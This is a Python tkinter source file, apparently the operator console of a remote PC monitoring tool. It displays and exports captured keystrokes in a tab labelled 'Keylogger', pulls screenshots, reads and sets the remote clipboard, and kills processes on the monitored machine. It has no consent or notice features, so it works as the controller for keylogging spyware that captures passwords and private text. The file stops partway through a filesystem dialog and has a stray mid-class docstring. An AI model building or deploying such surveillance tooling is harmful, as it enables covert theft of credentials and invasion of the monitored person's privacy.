"""
Server Tab - Individual server monitoring tab
Provides interface for monitoring a single PC
"""

import tkinter as tk
from tkinter import ttk, messagebox, filedialog
from PIL import Image, ImageTk
import io
import base64
from typing import Optional

from .api_client import APIClient


class PCTab(ttk.Frame):
    """Tab for monitoring a single PC connection"""

    def __init__(self, parent, main_app, name: str, server_url: str, api_key: str):
        super().__init__(parent)
        self.main_app = main_app
        self.name = name
        self.server_url = server_url
        self.api_key = api_key
        
        # Create API client
        self.api = APIClient(server_url, api_key)
        
        # State
        self.monitoring = False
        self.auto_refresh = False
        self.auto_refresh_job = None
        self.screenshots = []
        self.last_pc_id = None  # Track PC ID for callback matching

        # Create UI
        self.create_ui()

        # Initial status update
        self.update_status()

    def update_from_callback(self, data):
        """Update tab from callback data"""
        try:
            # Update monitoring status
            self.monitoring = data.get('monitoring', False)

            # Update status display
            events_count = data.get('event_count', 0)
            keystrokes_count = data.get('keystroke_count', 0)
            pc_name = data.get('pc_name', 'Unknown')

            status = "🟢 " if self.monitoring else "🔴 "
            status += f"{pc_name} | Events: {events_count} | Keystrokes: {keystrokes_count} [CALLBACK]"
            self.status_var.set(status)

            # Update events if available
            if 'events' in data:
                self.display_callback_events(data['events'])

            # Update keystrokes if available
            if 'keystrokes' in data:
                self.display_callback_keystrokes(data['keystrokes'])

        except Exception as e:
            print(f"Error updating from callback: {e}")

    def display_callback_events(self, events):
        """Display events received from callback"""
        try:
            # Add to events text widget
            for event in events[-10:]:  # Show last 10
                timestamp = event.get('timestamp', '')
                event_type = event.get('type', '')
                self.events_text.insert(tk.END, f"[CALLBACK] {timestamp} - {event_type}\n")

            # Auto-scroll to bottom
            self.events_text.see(tk.END)
        except Exception as e:
            print(f"Error displaying callback events: {e}")

    def display_callback_keystrokes(self, keystrokes):
        """Display keystrokes received from callback"""
        try:
            # Add to keylogger text widget
            for ks in keystrokes[-20:]:  # Show last 20
                key = ks.get('key', '')
                if not key.startswith('Key.'):
                    self.keylogger_text.insert(tk.END, key)

            # Auto-scroll to bottom
            self.keylogger_text.see(tk.END)
        except Exception as e:
            print(f"Error displaying callback keystrokes: {e}")

    def create_ui(self):
        """Create the tab UI elements"""
        # Create notebook for sub-tabs
        self.sub_notebook = ttk.Notebook(self)
        self.sub_notebook.pack(fill=tk.BOTH, expand=True)

        # Create sub-tabs
        self.overview_frame = ttk.Frame(self.sub_notebook)
        self.sub_notebook.add(self.overview_frame, text="Overview")

        self.keylogger_frame = ttk.Frame(self.sub_notebook)
        self.sub_notebook.add(self.keylogger_frame, text="Keylogger")

        self.screenshots_frame = ttk.Frame(self.sub_notebook)
        self.sub_notebook.add(self.screenshots_frame, text="Screenshots")

        self.search_frame = ttk.Frame(self.sub_notebook)
        self.sub_notebook.add(self.search_frame, text="Search")

        # Create control panel
        self.control_frame = ttk.LabelFrame(self, text="Controls")
        self.control_frame.pack(fill=tk.X, pady=5)

        # Add control buttons
        ttk.Button(self.control_frame, text="Refresh", 
                  command=self.refresh).pack(side=tk.LEFT, padx=5, pady=5)
        
        ttk.Button(self.control_frame, text="Start", 
                  command=self.start_monitoring).pack(side=tk.LEFT, padx=5, pady=5)
        
        ttk.Button(self.control_frame, text="Stop", 
                  command=self.stop_monitoring).pack(side=tk.LEFT, padx=5, pady=5)
        
        ttk.Button(self.control_frame, text="Snapshot", 
                  command=self.take_snapshot).pack(side=tk.LEFT, padx=5, pady=5)
        
        ttk.Button(self.control_frame, text="⚠ KILL SERVER", 
                  command=self.kill_server).pack(side=tk.LEFT, padx=5, pady=5)

        # Auto-refresh checkbox
        self.auto_refresh_var = tk.BooleanVar()
        ttk.Checkbutton(self.control_frame, text="Auto-refresh",
                       variable=self.auto_refresh_var,
                       command=self.toggle_auto_refresh).pack(side=tk.LEFT, padx=5, pady=5)

        # Advanced features
        ttk.Button(self.control_frame, text="Clipboard", 
                  command=self.show_clipboard_dialog).pack(side=tk.LEFT, padx=5, pady=5)
        
        ttk.Button(self.control_frame, text="Processes", 
                  command=self.show_process_dialog).pack(side=tk.LEFT, padx=5, pady=5)
        
        ttk.Button(self.control_frame, text="Files", 
                  command=self.show_filesystem_dialog).pack(side=tk.LEFT, padx=5, pady=5)
        
        ttk.Button(self.control_frame, text="Command", 
                  command=self.show_command_dialog).pack(side=tk.LEFT, padx=5, pady=5)

        # Status bar
        self.status_var = tk.StringVar()
        self.status_var.set("Not connected")
        self.status_bar = ttk.Label(self, textvariable=self.status_var, 
                                    relief=tk.SUNKEN, anchor=tk.W)
        self.status_bar.pack(fill=tk.X, side=tk.BOTTOM, pady=5)

        # Initialize tabs
        self.create_overview_tab()
        self.create_keylogger_tab()
        self.create_screenshots_tab()
        self.create_search_tab()

    def toggle_auto_refresh(self):
        """Toggle auto-refresh"""
        self.auto_refresh = self.auto_refresh_var.get()
        if self.auto_refresh:
            self.schedule_auto_refresh()
        elif self.auto_refresh_job:
            self.after_cancel(self.auto_refresh_job)
            self.auto_refresh_job = None

    def schedule_auto_refresh(self):
        """Schedule next auto-refresh"""
        if self.auto_refresh:
            self.refresh()
            self.auto_refresh_job = self.after(15000, self.schedule_auto_refresh)

    def refresh(self):
        """Refresh all data"""
        self.update_status()
        self.refresh_events()
        self.refresh_screenshot()

    def update_status(self):
        """Update connection status"""
        result = self.api.get_status()
        if result:
            self.monitoring = result.get('monitoring', False)
            events_count = result.get('event_count', 0)
            keystrokes_count = result.get('keystroke_count', 0)
            pc_name = result.get('pc_name', 'Unknown')
            
            # Store PC ID for callback matching
            self.last_pc_id = result.get('pc_id')

            status = "🟢 " if self.monitoring else "🔴 "
            status += f"{pc_name} | Events: {events_count} | Keystrokes: {keystrokes_count}"
            self.status_var.set(status)
        else:
            self.status_var.set("Connection error")

    def start_monitoring(self):
        """Start monitoring on server"""
        result = self.api.start_monitoring()
        if result:
            self.monitoring = True
            self.update_status()
            messagebox.showinfo("Success", "Monitoring started")
        else:
            messagebox.showerror("Error", "Failed to start monitoring")

    def stop_monitoring(self):
        """Stop monitoring on server"""
        result = self.api.stop_monitoring()
        if result:
            self.monitoring = False
            self.update_status()
            messagebox.showinfo("Success", "Monitoring stopped")
        else:
            messagebox.showerror("Error", "Failed to stop monitoring")

    def take_snapshot(self):
        """Take a snapshot on server"""
        result = self.api.take_snapshot()
        if result:
            messagebox.showinfo("Success", "Snapshot taken successfully")
            self.refresh_screenshot()
        else:
            messagebox.showerror("Error", "Failed to take snapshot")

    def kill_server(self):
        """Kill the server process"""
        if messagebox.askyesno("Confirm", 
                              "This will terminate the server process. Continue?"):
            result = self.api.kill_server()
            if result:
                messagebox.showinfo("Success", "Server kill signal sent")
            else:
                messagebox.showinfo("Info", 
                                  "Server may have been killed (connection lost)")

    # ===== Overview Tab =====
    def create_overview_tab(self):
        """Create overview tab content"""
        # Split frame
        left_frame = ttk.Frame(self.overview_frame)
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        right_frame = ttk.Frame(self.overview_frame)
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)

        # Screenshot preview
        screenshot_frame = ttk.LabelFrame(left_frame, text="Live View")
        screenshot_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        self.screenshot_label = ttk.Label(screenshot_frame, 
                                         text="No screenshot available")
        self.screenshot_label.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        ttk.Button(screenshot_frame, text="Refresh Screenshot", 
                  command=self.refresh_screenshot).pack(pady=5)

        # Events list
        events_frame = ttk.LabelFrame(right_frame, text="Activity Log")
        events_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        self.events_text = tk.Text(events_frame, wrap=tk.WORD, height=20)
        self.events_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        events_scroll = ttk.Scrollbar(events_frame, command=self.events_text.yview)
        events_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.events_text.config(yscrollcommand=events_scroll.set)

        ttk.Button(events_frame, text="Refresh Events", 
                  command=self.refresh_events).pack(pady=5)

    def refresh_screenshot(self):
        """Refresh screenshot preview"""
        result = self.api.get_latest_screenshot()
        if result and 'image' in result:
            try:
                img_data = base64.b64decode(result['image'])
                img = Image.open(io.BytesIO(img_data))
                img.thumbnail((640, 360), Image.Resampling.LANCZOS)
                photo = ImageTk.PhotoImage(img)
                self.screenshot_label.config(image=photo, text="")
                self.screenshot_label.image = photo  # Keep reference
            except Exception as e:
                self.screenshot_label.config(text=f"Error: {str(e)}", image="")
        else:
            self.screenshot_label.config(text="No screenshot available", image="")

    def refresh_events(self):
        """Refresh events list"""
        events = self.api.get_events(limit=50)
        if events:
            self.events_text.delete(1.0, tk.END)
            for event in reversed(events):
                timestamp = event.get('timestamp', '')
                event_type = event.get('type', '')
                details = event.get('details', {})

                if event_type == 'key_press':
                    key = details.get('key', '')
                    window = details.get('window', '')
                    self.events_text.insert(tk.END, 
                                          f"{timestamp} - Key: {key} in {window}\n")
                elif event_type == 'mouse_click':
                    button = details.get('button', '')
                    x = details.get('x', 0)
                    y = details.get('y', 0)
                    window = details.get('window', '')
                    self.events_text.insert(tk.END, 
                                          f"{timestamp} - Mouse {button} at ({x},{y}) in {window}\n")
                elif event_type == 'window_change':
                    title = details.get('title', '')
                    self.events_text.insert(tk.END, 
                                          f"{timestamp} - Window: {title}\n")
                else:
                    self.events_text.insert(tk.END, 
                                          f"{timestamp} - {event_type}\n")
        else:
            self.events_text.delete(1.0, tk.END)
            self.events_text.insert(tk.END, "Error loading events")

    # ===== Keylogger Tab =====
    def create_keylogger_tab(self):
        """Create keylogger tab content"""
        # Live keystrokes frame
        live_frame = ttk.LabelFrame(self.keylogger_frame, text="Live Keystrokes")
        live_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        self.keylogger_text = tk.Text(live_frame, wrap=tk.WORD, height=10)
        self.keylogger_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        keylogger_scroll = ttk.Scrollbar(live_frame, command=self.keylogger_text.yview)
        keylogger_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.keylogger_text.config(yscrollcommand=keylogger_scroll.set)

        # Controls
        controls_frame = ttk.Frame(self.keylogger_frame)
        controls_frame.pack(fill=tk.X, padx=5, pady=5)

        ttk.Button(controls_frame, text="Clear", 
                  command=lambda: self.keylogger_text.delete(1.0, tk.END)).pack(side=tk.LEFT, padx=5)
        
        ttk.Button(controls_frame, text="Load Buffer", 
                  command=self.load_keystrokes).pack(side=tk.LEFT, padx=5)
        
        ttk.Button(controls_frame, text="Export Text", 
                  command=self.export_keystrokes).pack(side=tk.LEFT, padx=5)

    def load_keystrokes(self):
        """Load keystrokes from server"""
        result = self.api.get_keystroke_buffer(limit=1000, format_type='text')
        if result:
            self.keylogger_text.delete(1.0, tk.END)
            if isinstance(result, dict) and 'text' in result:
                self.keylogger_text.insert(tk.END, result.get('text', ''))
            elif isinstance(result, str):
                self.keylogger_text.insert(tk.END, result)
        else:
            messagebox.showerror("Error", "Failed to get keystrokes")

    def export_keystrokes(self):
        """Export keystrokes to file"""
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if filename:
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(self.keylogger_text.get(1.0, tk.END))
                messagebox.showinfo("Success", f"Keystrokes exported to {filename}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to export: {str(e)}")
                """
Server Tab - Part 2: Screenshots, Search, and Dialogs
"""

    # ===== Screenshots Tab =====
    def create_screenshots_tab(self):
        """Create screenshots tab content"""
        # Split frame
        left_frame = ttk.Frame(self.screenshots_frame)
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        right_frame = ttk.Frame(self.screenshots_frame)
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)

        # Screenshots list
        list_frame = ttk.LabelFrame(left_frame, text="Screenshots")
        list_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        self.screenshots_listbox = tk.Listbox(list_frame, height=20)
        self.screenshots_listbox.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.screenshots_listbox.bind('<<ListboxSelect>>', self.preview_screenshot)
        self.screenshots_listbox.bind('<Double-Button-1>', self.show_fullscreen)

        screenshots_scroll = ttk.Scrollbar(list_frame, 
                                          command=self.screenshots_listbox.yview)
        screenshots_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.screenshots_listbox.config(yscrollcommand=screenshots_scroll.set)

        ttk.Button(list_frame, text="Refresh Gallery", 
                  command=self.refresh_gallery).pack(pady=5)

        # Preview
        preview_frame = ttk.LabelFrame(right_frame, text="Preview")
        preview_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        self.preview_label = ttk.Label(preview_frame, text="Select a screenshot")
        self.preview_label.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

    def refresh_gallery(self):
        """Refresh screenshots gallery"""
        screenshots = self.api.get_screenshot_history()
        if screenshots:
            self.screenshots_listbox.delete(0, tk.END)
            self.screenshots = screenshots
            for screenshot in screenshots:
                filename = screenshot.get('filename', '')
                timestamp = screenshot.get('timestamp', '')
                self.screenshots_listbox.insert(tk.END, f"{timestamp} - {filename}")
        else:
            self.screenshots_listbox.delete(0, tk.END)

    def preview_screenshot(self, event):
        """Preview selected screenshot"""
        try:
            selection = self.screenshots_listbox.curselection()
            if selection:
                index = selection[0]
                filename = self.screenshots[index]['filename']
                result = self.api.get_screenshot(filename)
                if result and 'image' in result:
                    img_data = base64.b64decode(result['image'])
                    img = Image.open(io.BytesIO(img_data))
                    img.thumbnail((400, 300), Image.Resampling.LANCZOS)
                    photo = ImageTk.PhotoImage(img)
                    self.preview_label.config(image=photo, text="")
                    self.preview_label.image = photo  # Keep reference
        except Exception as e:
            messagebox.showerror("Error", f"Failed to preview: {str(e)}")

    def show_fullscreen(self, event):
        """Show fullscreen image"""
        try:
            selection = self.screenshots_listbox.curselection()
            if selection:
                index = selection[0]
                filename = self.screenshots[index]['filename']
                result = self.api.get_screenshot(filename)
                if result and 'image' in result:
                    img_data = base64.b64decode(result['image'])
                    img = Image.open(io.BytesIO(img_data))

                    top = tk.Toplevel(self)
                    top.title(filename)

                    screen_width = top.winfo_screenwidth()
                    screen_height = top.winfo_screenheight()
                    img_width, img_height = img.size

                    scale = min(screen_width / img_width, 
                               screen_height / img_height) * 0.9
                    new_width = int(img_width * scale)
                    new_height = int(img_height * scale)

                    img = img.resize((new_width, new_height), Image.Resampling.LANCZOS)
                    photo = ImageTk.PhotoImage(img)

                    label = ttk.Label(top, image=photo)
                    label.image = photo  # Keep reference
                    label.pack(fill=tk.BOTH, expand=True)
                    label.bind('<Button-1>', lambda e: top.destroy())
        except Exception as e:
            messagebox.showerror("Error", f"Failed to show fullscreen: {str(e)}")

    # ===== Search Tab =====
    def create_search_tab(self):
        """Create search tab content"""
        controls_frame = ttk.Frame(self.search_frame)
        controls_frame.pack(fill=tk.X, padx=5, pady=5)

        ttk.Label(controls_frame, text="Search:").grid(
            row=0, column=0, padx=5, pady=5, sticky=tk.W)
        self.search_var = tk.StringVar()
        ttk.Entry(controls_frame, textvariable=self.search_var, width=30).grid(
            row=0, column=1, padx=5, pady=5)

        ttk.Label(controls_frame, text="Type:").grid(
            row=0, column=2, padx=5, pady=5, sticky=tk.W)
        self.event_type_var = tk.StringVar()
        type_combo = ttk.Combobox(controls_frame, textvariable=self.event_type_var, 
                                  width=15)
        type_combo['values'] = ('', 'key_press', 'mouse_click', 'window_change', 
                               'screenshot')
        type_combo.grid(row=0, column=3, padx=5, pady=5)

        ttk.Button(controls_frame, text="Search", 
                  command=self.search_events).grid(row=0, column=4, padx=5, pady=5)
        
        ttk.Button(controls_frame, text="Clear", 
                  command=self.clear_search).grid(row=0, column=5, padx=5, pady=5)

        results_frame = ttk.LabelFrame(self.search_frame, text="Results")
        results_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        self.results_text = tk.Text(results_frame, wrap=tk.WORD)
        self.results_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        scroll = ttk.Scrollbar(results_frame, command=self.results_text.yview)
        scroll.pack(side=tk.RIGHT, fill=tk.Y)
        self.results_text.config(yscrollcommand=scroll.set)

    def search_events(self):
        """Search events"""
        events = self.api.get_events(
            limit=1000,
            event_type=self.event_type_var.get() or None,
            search=self.search_var.get() or None
        )
        
        if events:
            self.results_text.delete(1.0, tk.END)
            if not events:
                self.results_text.insert(tk.END, "No results found.")
                return

            for event in events:
                timestamp = event.get('timestamp', '')
                event_type = event.get('type', '')
                details = event.get('details', {})
                self.results_text.insert(tk.END, 
                                       f"{timestamp} - {event_type}: {details}\n")
        else:
            self.results_text.delete(1.0, tk.END)
            self.results_text.insert(tk.END, "Search failed or no results")

    def clear_search(self):
        """Clear search"""
        self.search_var.set("")
        self.event_type_var.set("")
        self.results_text.delete(1.0, tk.END)

    # ===== Dialog Functions =====
    def show_clipboard_dialog(self):
        """Show improved clipboard dialog"""
        dialog = tk.Toplevel(self)
        dialog.title("Clipboard Monitor")
        dialog.geometry("700x500")
        dialog.transient(self.winfo_toplevel())

        # Create notebook for tabs
        notebook = ttk.Notebook(dialog)
        notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # Current clipboard tab
        current_frame = ttk.Frame(notebook)
        notebook.add(current_frame, text="Current Clipboard")

        ttk.Label(current_frame, text="Current clipboard content:", 
                font=('Arial', 10, 'bold')).pack(pady=5, anchor=tk.W, padx=10)

        current_text = tk.Text(current_frame, wrap=tk.WORD, height=10)
        current_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        current_scroll = ttk.Scrollbar(current_frame, command=current_text.yview)
        current_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        current_text.config(yscrollcommand=current_scroll.set)

        # Buttons frame
        btn_frame1 = ttk.Frame(current_frame)
        btn_frame1.pack(fill=tk.X, padx=10, pady=5)

        def get_clipboard():
            result = self.api.get_clipboard()
            if result and result.get('success'):
                current_text.delete(1.0, tk.END)
                content = result.get('content', '')
                current_text.insert(tk.END, content)
                messagebox.showinfo("Success", f"Retrieved {len(content)} characters")
            else:
                error = result.get('error', 'Unknown error') if result else 'Connection failed'
                messagebox.showerror("Error", f"Failed to get clipboard: {error}")

        def set_clipboard():
            content = current_text.get(1.0, tk.END).strip()
            if not content:
                messagebox.showwarning("Warning", "Clipboard content is empty")
                return
            
            result = self.api.set_clipboard(content)
            if result and result.get('success'):
                messagebox.showinfo("Success", "Clipboard updated on remote PC")
            else:
                error = result.get('error', 'Unknown error') if result else 'Connection failed'
                messagebox.showerror("Error", f"Failed to set clipboard: {error}")

        def clear_text():
            current_text.delete(1.0, tk.END)

        ttk.Button(btn_frame1, text="🔄 Get Clipboard", 
                command=get_clipboard).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame1, text="📤 Set Clipboard", 
                command=set_clipboard).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame1, text="🗑️ Clear", 
                command=clear_text).pack(side=tk.LEFT, padx=5)

        # History tab
        history_frame = ttk.Frame(notebook)
        notebook.add(history_frame, text="History")

        history_tree = ttk.Treeview(history_frame, 
                                    columns=('Time', 'Length', 'Preview'),
                                    show='headings',
                                    height=15)
        history_tree.heading('Time', text='Timestamp')
        history_tree.heading('Length', text='Length')
        history_tree.heading('Preview', text='Preview')
        
        history_tree.column('Time', width=150)
        history_tree.column('Length', width=80)
        history_tree.column('Preview', width=400)
        
        history_tree.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        history_scroll = ttk.Scrollbar(history_frame, orient=tk.VERTICAL, 
                                    command=history_tree.yview)
        history_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        history_tree.config(yscrollcommand=history_scroll.set)

        def load_history():
            history_tree.delete(*history_tree.get_children())
            # This endpoint needs to be added to the server
            # For now, show a placeholder message
            messagebox.showinfo("Info", 
                            "Clipboard history tracking requires server update.\n"
                            "Enable clipboard monitoring on server first.")

        ttk.Button(history_frame, text="🔄 Refresh History", 
                command=load_history).pack(pady=5)

        # Auto-load current clipboard on open
        dialog.after(500, get_clipboard)

    def show_process_dialog(self):
        """Show improved process manager dialog"""
        dialog = tk.Toplevel(self)
        dialog.title("Process Manager")
        dialog.geometry("1000x700")
        dialog.transient(self.winfo_toplevel())

        # Top controls
        control_frame = ttk.Frame(dialog)
        control_frame.pack(fill=tk.X, padx=10, pady=10)

        # Search box
        ttk.Label(control_frame, text="Search:").pack(side=tk.LEFT, padx=5)
        search_var = tk.StringVar()
        search_entry = ttk.Entry(control_frame, textvariable=search_var, width=30)
        search_entry.pack(side=tk.LEFT, padx=5)

        def search_processes():
            query = search_var.get().strip()
            if query:
                load_processes(search=query)
            else:
                load_processes()

        ttk.Button(control_frame, text="🔍 Search", 
                command=search_processes).pack(side=tk.LEFT, padx=5)
        ttk.Button(control_frame, text="🔄 Refresh All", 
                command=lambda: load_processes()).pack(side=tk.LEFT, padx=5)

        # Process list with grouping
        tree_frame = ttk.Frame(dialog)
        tree_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        tree = ttk.Treeview(tree_frame, 
                        columns=('PID', 'Name', 'User', 'CPU', 'Memory', 'Instances'),
                        show='headings',
                        height=20)
        
        tree.heading('PID', text='PID')
        tree.heading('Name', text='Process Name')
        tree.heading('User', text='User')
        tree.heading('CPU', text='CPU %')
        tree.heading('Memory', text='Memory (MB)')
        tree.heading('Instances', text='Instances')
        
        tree.column('PID', width=80)
        tree.column('Name', width=250)
        tree.column('User', width=150)
        tree.column('CPU', width=80)
        tree.column('Memory', width=100)
        tree.column('Instances', width=80)
        
        tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        scroll = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=tree.yview)
        scroll.pack(side=tk.RIGHT, fill=tk.Y)
        tree.config(yscrollcommand=scroll.set)

        # Selection info
        selection_frame = ttk.LabelFrame(dialog, text="Selected Process")
        selection_frame.pack(fill=tk.X, padx=10, pady=5)

        selected_info = tk.StringVar(value="No process selected")
        ttk.Label(selection_frame, textvariable=selected_info).pack(padx=10, pady=5)

        # Action controls
        action_frame = ttk.LabelFrame(dialog, text="Actions")
        action_frame.pack(fill=tk.X, padx=10, pady=5)

        # PID/Name input
        input_container = ttk.Frame(action_frame)
        input_container.pack(fill=tk.X, padx=10, pady=5)

        ttk.Label(input_container, text="Process:").pack(side=tk.LEFT, padx=5)
        
        process_input = tk.StringVar()
        process_entry = ttk.Entry(input_container, textvariable=process_input, width=30)
        process_entry.pack(side=tk.LEFT, padx=5)

        # Options
        options_frame = ttk.Frame(action_frame)
        options_frame.pack(fill=tk.X, padx=10, pady=5)

        force_var = tk.BooleanVar(value=False)
        kill_all_var = tk.BooleanVar(value=True)
        kill_tree_var = tk.BooleanVar(value=False)

        ttk.Checkbutton(options_frame, text="Force Kill", 
                    variable=force_var).pack(side=tk.LEFT, padx=10)
        ttk.Checkbutton(options_frame, text="Kill All Instances", 
                    variable=kill_all_var).pack(side=tk.LEFT, padx=10)
        ttk.Checkbutton(options_frame, text="Kill Process Tree", 
                    variable=kill_tree_var).pack(side=tk.LEFT, padx=10)

        # Status bar
        status_var = tk.StringVar(value="Ready")
        status_bar = ttk.Label(dialog, textvariable=status_var, 
                            relief=tk.SUNKEN, anchor=tk.W)
        status_bar.pack(fill=tk.X, side=tk.BOTTOM, padx=10, pady=5)

        # Store process data
        current_processes = []

        def load_processes(search=None):
            """Load and display processes"""
            tree.delete(*tree.get_children())
            status_var.set("Loading processes...")
            dialog.update()
            
            if search:
                # Use search endpoint
                result = self.api._make_request('GET', '/api/process', 
                                            params={'search': search})
            else:
                result = self.api.get_processes()
            
            if result and result.get('success'):
                nonlocal current_processes
                current_processes = result.get('processes', [])
                
                # Group by process name to show instance count
                process_groups = {}
                for proc in current_processes:
                    name = proc['name']
                    if name not in process_groups:
                        process_groups[name] = []
                    process_groups[name].append(proc)
                
                # Display grouped processes
                for name, instances in sorted(process_groups.items()):
                    if len(instances) == 1:
                        # Single instance - show normally
                        proc = instances[0]
                        tree.insert('', tk.END, values=(
                            proc['pid'],
                            proc['name'],
                            proc['username'],
                            f"{proc['cpu_percent']:.1f}",
                            f"{proc['memory_mb']:.1f}",
                            "1"
                        ))
                    else:
                        # Multiple instances - show parent with total stats
                        total_cpu = sum(p['cpu_percent'] for p in instances)
                        total_mem = sum(p['memory_mb'] for p in instances)
                        avg_cpu = total_cpu / len(instances)
                        
                        # Insert parent
                        parent_id = tree.insert('', tk.END, values=(
                            f"Multiple",
                            f"{name} (Multiple)",
                            instances[0]['username'],
                            f"{avg_cpu:.1f}",
                            f"{total_mem:.1f}",
                            len(instances)
                        ), tags=('parent',))
                        
                        # Insert children
                        for proc in instances:
                            tree.insert(parent_id, tk.END, values=(
                                proc['pid'],
                                proc['name'],
                                proc['username'],
                                f"{proc['cpu_percent']:.1f}",
                                f"{proc['memory_mb']:.1f}",
                                "1"
                            ))
                
                status_var.set(f"✓ Loaded {len(current_processes)} processes ({len(process_groups)} unique)")
            else:
                status_var.set("✗ Failed to load processes")
                messagebox.showerror("Error", "Failed to load processes")

        def on_tree_select(event):
            """Handle tree selection"""
            selection = tree.selection()
            if selection:
                values = tree.item(selection[0])['values']
                if values:
                    pid = values[0]
                    name = values[1]
                    
                    # Update input field
                    if str(pid).isdigit():
                        process_input.set(str(pid))
                        selected_info.set(f"Selected: PID {pid} - {name}")
                    else:
                        # Parent node with multiple instances
                        process_name = name.replace(" (Multiple)", "")
                        process_input.set(process_name)
                        selected_info.set(f"Selected: {name} - Use 'Kill All Instances'")

        tree.bind('<<TreeviewSelect>>', on_tree_select)

        def kill_process():
            """Kill selected process"""
            input_val = process_input.get().strip()
            if not input_val:
                messagebox.showwarning("Warning", "Enter PID or process name")
                return
            
            # Determine if input is PID or name
            if input_val.isdigit():
                # Kill by PID
                pid = int(input_val)
                status_var.set(f"Killing PID {pid}...")
                dialog.update()
                
                data = {
                    'pid': pid,
                    'force': force_var.get(),
                    'kill_tree': kill_tree_var.get()
                }
            else:
                # Kill by name
                status_var.set(f"Killing {input_val}...")
                dialog.update()
                
                data = {
                    'name': input_val,
                    'force': force_var.get(),
                    'kill_all': kill_all_var.get()
                }
            
            # Send kill request
            result = self.api._make_request('POST', '/api/process/kill', json=data)
            
            if result and result.get('success'):
                killed_count = result.get('killed_count', 1)
                status_var.set(f"✓ Successfully killed {killed_count} process(es)")
                
                # Show detailed results
                message = result.get('message', 'Process killed')
                if 'killed' in result:
                    killed_list = "\n".join([
                        f"  - {k['name']} (PID {k['pid']})"
                        for k in result['killed']
                    ])
                    message += f"\n\nKilled:\n{killed_list}"
                
                if result.get('failed'):
                    failed_list = "\n".join([
                        f"  - PID {f['pid']}: {f.get('error', 'Unknown')}"
                        for f in result['failed']
                    ])
                    message += f"\n\nFailed:\n{failed_list}"
                
                messagebox.showinfo("Success", message)
                
                # Refresh list
                load_processes()
            else:
                error = result.get('error', 'Unknown error') if result else 'Connection failed'
                status_var.set(f"✗ Failed to kill process")
                messagebox.showerror("Error", f"Failed to kill process:\n{error}")

        def show_instances():
            """Show all instances of selected process"""
            input_val = process_input.get().strip()
            if not input_val or input_val.isdigit():
                messagebox.showwarning("Warning", "Enter process name (not PID)")
                return
            
            status_var.set(f"Finding instances of {input_val}...")
            dialog.update()
            
            result = self.api._make_request('GET', f'/api/process/instances/{input_val}')
            
            if result and result.get('success'):
                instances = result.get('instances', [])
                
                if not instances:
                    messagebox.showinfo("Info", f"No instances of '{input_val}' found")
                    return
                
                # Show in messagebox
                instance_list = "\n".join([
                    f"PID {inst['pid']}: {inst['memory_mb']:.1f} MB, User: {inst['username']}"
                    for inst in instances
                ])
                
                messagebox.showinfo(
                    f"Instances of {input_val}",
                    f"Found {len(instances)} instance(s):\n\n{instance_list}"
                )
                status_var.set(f"✓ Found {len(instances)} instances")
            else:
                status_var.set("✗ Failed to get instances")
                messagebox.showerror("Error", "Failed to get process instances")

        # Action buttons
        btn_frame = ttk.Frame(action_frame)
        btn_frame.pack(fill=tk.X, padx=10, pady=5)

        ttk.Button(btn_frame, text="🎯 Kill Selected", 
                command=kill_process).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="📋 Show Instances", 
                command=show_instances).pack(side=tk.LEFT, padx=5)
        
        # Quick kill buttons
        quick_frame = ttk.LabelFrame(dialog, text="Quick Kill")
        quick_frame.pack(fill=tk.X, padx=10, pady=5)

        common_processes = [
            ("Chrome", "chrome.exe"),
            ("Firefox", "firefox.exe"),
            ("Edge", "msedge.exe"),
            ("Notepad", "notepad.exe"),
            ("Calculator", "calc.exe"),
            ("Paint", "mspaint.exe"),
            ("Spotify", "spotify.exe"),
            ("Discord", "discord.exe"),
            ("Steam", "steam.exe"),
        ]

        def quick_kill(process_name):
            process_input.set(process_name)
            kill_all_var.set(True)
            kill_process()

        for idx, (label, proc_name) in enumerate(common_processes):
            ttk.Button(quick_frame, text=label, width=12,
                    command=lambda p=proc_name: quick_kill(p)).grid(
                row=idx//5, column=idx%5, padx=5, pady=5)

        # Bind Enter key
        search_entry.bind('<Return>', lambda e: search_processes())
        process_entry.bind('<Return>', lambda e: kill_process())

        # Initial load
        dialog.after(100, load_processes)

    def show_filesystem_dialog(self):
        """Show filesystem browser dialog"""
        dialog = tk.Toplevel(self)
        dialog.title("Filesystem Browser")
        dialog.geometry("900x600")
        dialog.transient(self.winfo_toplevel())

        # Path entry
        path_frame = ttk.Frame(dialog)
        path_frame.pack(fill=tk.X, padx=10, pady=5)
        
        path_var = tk.StringVar(value="C:\\")
